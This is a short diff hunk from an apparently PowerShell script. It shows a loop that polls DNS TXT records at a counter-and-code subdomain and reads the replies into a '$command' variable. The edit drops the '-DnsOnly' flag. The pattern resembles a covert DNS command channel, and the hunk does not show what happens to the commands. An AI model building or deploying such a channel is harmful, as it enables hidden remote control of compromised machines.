@@ -74,7 +74,7 @@ $commandcount = 0
 $stop = $false
 while (!$stop) {
     Write-Host "Request to: $commandcount.$code.$domain"
-    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Type TXT -DnsOnly -ErrorAction Ignore
+    $dnsResult = Resolve-DnsName -Name "$commandcount.$code.$domain" -Type TXT -ErrorAction Ignore
     if ($dnsResult) {
         try{
             $command = $dnsResult.Strings
